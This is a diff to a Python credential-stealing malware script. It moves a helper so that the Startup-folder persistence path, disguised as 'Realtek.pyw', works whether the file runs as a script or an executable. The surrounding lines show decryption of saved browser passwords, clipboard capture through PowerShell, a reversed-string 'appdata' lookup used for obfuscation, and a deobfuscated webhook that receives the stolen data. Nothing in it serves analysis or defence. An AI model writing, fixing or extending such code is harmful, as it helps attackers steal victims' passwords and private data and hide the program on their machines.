@@ -250,7 +250,17 @@ def decrval(buff, master_key=None):
         return decrypted_pass
     
 
+def check_python_or_convert(file_path):
+    
+    
+    _, file_extension = os.path.splitext(file_path)
 
+    if ".py" in file_path:
+        return file_path 
+
+    file_path = os.path.splitext(file_path)[0] + ".exe"
+
+    return file_path
 def Clipboard():
     try:
         command = 'Get-Clipboard -TextFormatType Text'
@@ -262,7 +272,7 @@ def Clipboard():
 
 apppp = 'atadppa'
 path = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"
-
+path = check_python_or_convert(path)
 def get_random_path():
     possible_paths = [os.getenv("APPDATA"), os.getenv("LOCALAPPDATA")]
     chosen_path = random.choice(possible_paths)
@@ -283,17 +293,6 @@ def create_copy_and_return_new_path():
     
     return new_path
 
-def check_python_or_convert(file_path):
-    
-    
-    _, file_extension = os.path.splitext(file_path)
-
-    if ".py" in file_path:
-        return file_path 
-
-    file_path = os.path.splitext(file_path)[0] + ".exe"
-
-    return file_path
 
 def deobf(encrypted_text, key):
     decrypted = [0] * 256
@@ -339,6 +338,7 @@ def startup():
     else:
         if __file__.replace('\\', '/') != path.replace('\\', '/'):
             pass
+
 def LoadUrlib(hook, data='', files='', headers=''):
     
     hook = deobf(webhook[0],webhook[1]).decode()
